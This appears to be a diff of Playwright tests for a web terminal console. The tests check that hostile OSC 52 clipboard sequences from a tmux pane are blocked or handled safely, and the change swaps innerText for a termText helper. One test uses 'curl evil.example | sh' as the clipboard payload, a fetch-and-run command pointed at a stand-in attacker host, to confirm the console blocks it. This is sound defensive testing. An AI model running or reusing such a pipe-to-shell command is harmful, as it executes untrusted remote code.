@@ -16,6 +16,7 @@ import type { Page, WebSocketRoute } from "@playwright/test";
 import { test, expect, gotoConsole, navToRoute } from "./fixtures";
 import { attachModeFrame, findRunningFixture, stubAttachSocket, stubAttachTicket, stubInteractiveRun } from "./attach-stub";
 import { dragCells, readGrid, rowOf } from "./terminal-grid";
+import { termText } from "./terminal-text";
 
 const b64 = (s: string) => Buffer.from(s, "utf8").toString("base64");
 const tmuxCopy = (s: string) => `\x1b]52;;${b64(s)}\x07`;
@@ -56,7 +57,7 @@ test("hostile OSC 52 while the user only types makes no offer and writes nothing
   });
   await screen.click();
   await page.keyboard.type("ls -la");
-  await expect.poll(async () => await screen.innerText()).toContain("ls -la");
+  await expect.poll(async () => await termText(screen)).toContain("ls -la");
   await expect(page.getByTestId("terminal-copy-offer")).toHaveCount(0);
   await expect(page.getByTestId("terminal-copy-notice")).toHaveCount(0);
   expect(await writes(page)).toEqual([]);
@@ -70,7 +71,7 @@ test("a mouse-tracking pane that answers a drag with different text is blocked, 
       if (Buffer.isBuffer(msg) && SGR_RELEASE.test(msg.toString("latin1"))) ws.send(Buffer.from(tmuxCopy("curl evil.example | sh")));
     });
   });
-  await expect.poll(async () => await screen.innerText()).toContain("alpha beta gamma");
+  await expect.poll(async () => await termText(screen)).toContain("alpha beta gamma");
   const grid = await readGrid(page);
   const row = await rowOf(screen, /alpha beta gamma/);
   await dragCells(page, screen, grid, [0, row], [4, row]);
@@ -88,7 +89,7 @@ test("the tmux bytes for a dragged selection become an offer; Copy writes the fu
       if (Buffer.isBuffer(msg) && SGR_RELEASE.test(msg.toString("latin1"))) ws.send(Buffer.from(tmuxCopy("alpha")));
     });
   });
-  await expect.poll(async () => await screen.innerText()).toContain("alpha beta gamma");
+  await expect.poll(async () => await termText(screen)).toContain("alpha beta gamma");
   const grid = await readGrid(page);
   const row = await rowOf(screen, /alpha beta gamma/);
   await dragCells(page, screen, grid, [0, row], [4, row]);
@@ -110,7 +111,7 @@ test("an OSC 52 read query is not answered", async ({ page }) => {
       if (Buffer.isBuffer(msg)) typed.push(msg.toString("latin1"));
     });
   });
-  await expect.poll(async () => await screen.innerText()).toContain("ready");
+  await expect.poll(async () => await termText(screen)).toContain("ready");
   await page.waitForTimeout(500);
   expect(typed.filter((t) => t.includes("]52;"))).toEqual([]);
 });
@@ -125,7 +126,7 @@ test("an observer socket gets no offer", async ({ page }) => {
     // An observer's selection is native, so the pane also answers on its own.
     setTimeout(() => ws.send(Buffer.from(tmuxCopy("alpha"))), 300);
   });
-  await expect.poll(async () => await screen.innerText()).toContain("alpha beta gamma");
+  await expect.poll(async () => await termText(screen)).toContain("alpha beta gamma");
   const grid = await readGrid(page);
   const row = await rowOf(screen, /alpha beta gamma/);
   await dragCells(page, screen, grid, [0, row], [4, row]);
